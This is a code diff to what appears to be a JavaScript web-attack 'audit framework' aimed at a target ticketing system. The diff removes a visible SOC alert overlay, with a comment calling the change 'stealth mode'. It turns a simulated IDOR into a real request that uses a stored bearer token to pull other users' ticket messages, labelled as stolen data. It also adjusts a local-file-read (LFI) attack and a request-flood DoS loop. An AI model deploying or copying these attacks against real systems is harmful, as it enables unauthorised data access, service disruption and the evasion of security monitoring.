@@ -461,13 +461,8 @@
     </div>
 </div>
 
-<!-- Hacker Alert Overlay -->
-<div id="hacker-overlay"
-    style="display:none; position:fixed; inset:0; background:rgba(0,255,0,0.05); z-index:100000; pointer-events:none; border: 4px solid #4ade80; box-shadow: inset 0 0 100px rgba(0,255,0,0.2);">
-    <div
-        style="position:absolute; top:20px; left:50%; transform:translateX(-50%); background:#4ade80; color:#000; padding:10px 30px; font-weight:900; font-family:monospace; font-size:1.5rem;">
-        ALERTA SOC: XSS EJECUTADO</div>
-</div>
+<!-- Hacker Alert Overlay (Removido por petición: stealth mode) -->
+<div id="hacker-overlay" style="display:none;"></div>
 
 <script>
     console.log("Sofia Solutions Audit Framework v4.8.5 - Finalized.");
@@ -519,9 +514,9 @@
             title: 'IDOR',
             config: `<label class="cfg-label">ID VÍCTIMA (Registro ajeno)</label>
                  <select class="cfg-input" id="idor-id">
-                    <option value="1024">Ticket #1024 (MAPFRE)</option>
-                    <option value="1">Ticket #1 (Root/Admin)</option>
-                    <option value="999">Ticket #999 (Iberdrola)</option>
+                    <option value="1">Ticket #1 (Administración)</option>
+                    <option value="2">Ticket #2 (Iberdrola Privado)</option>
+                    <option value="4">Ticket #4 (Mercadona Crítico)</option>
                  </select>`,
             run: runIDOR
         },
@@ -701,9 +696,6 @@
         tLog(`[*] Lanzando ataque XSS Reflejado...`, 'yellow');
         await delay(600);
 
-        document.getElementById('hacker-overlay').style.display = 'block';
-        setTimeout(() => document.getElementById('hacker-overlay').style.display = 'none', 3000);
-
         if (action === 'cookie') {
             tLog(`[INFO] Document cookie accessed via XSS`, 'cyan');
             tLog(`[!] Iniciando Burp Suite para interceptar sesión...`, 'yellow');
@@ -728,7 +720,8 @@
         tLog(`[*] LFI: Intentando leer ${file}`, 'yellow');
         await delay(800);
         try {
-            const r = await fetch(TARGET + '/download.php?file=' + encodeURIComponent(file));
+            // LFI directo al frontend PHP
+            const r = await fetch('/download.php?file=' + encodeURIComponent(file));
             const txt = await r.text();
             if (r.ok && !txt.includes('Access Denied')) {
                 tLog(`[+] Archivo exfiltrado.`, 'green');
@@ -743,8 +736,24 @@
         const id = document.getElementById('idor-id').value;
         tLog(`[*] IDOR: Accediendo a recurso ID ${id}`, 'yellow');
         await delay(500);
-        tLog(`[+] Acceso BOLA/IDOR exitoso.`, 'green');
-        addEvidence('Private Resource Access', `Ticket #${id}\nClient: MAPFRE\nStatus: CRITICAL`);
+        
+        try {
+            const token = localStorage.getItem('sofia_token_CLIENT') || localStorage.getItem('sofia_token_ADMIN');
+            // Ataque real: Acceso a mensajes de un ticket sin validar propiedad
+            const r = await fetch(TARGET + '/api/tickets/' + id + '/messages', {
+                headers: { 'Authorization': `Bearer ${token}` }
+            });
+            
+            if (r.ok) {
+                const d = await r.json();
+                tLog(`[+] Acceso BOLA/IDOR exitoso. Recurso recuperado.`, 'green');
+                addEvidence('BOLA/IDOR Data Stolen', JSON.stringify(d, null, 2));
+            } else {
+                tLog(`[-] Error en el acceso al recurso (IDOR Fallido).`, 'red');
+            }
+        } catch (e) {
+            tLog(`[CRITICAL] Error de red en IDOR`, 'red');
+        }
     }
 
     async function runDoS() {
@@ -752,7 +761,7 @@
         tLog(`[*] DoS: Iniciando ráfaga de ${count} peticiones...`, 'red');
         let blocked = 0;
         for (let i = 0; i < count; i++) {
-            fetch(TARGET + '/api/public/health').then(r => { if (r.status === 429) blocked++; });
+            fetch(TARGET + '/api/health').then(r => { if (r.status === 429) blocked++; });
             if (i % 10 === 0) await delay(5);
         }
         await delay(1000);
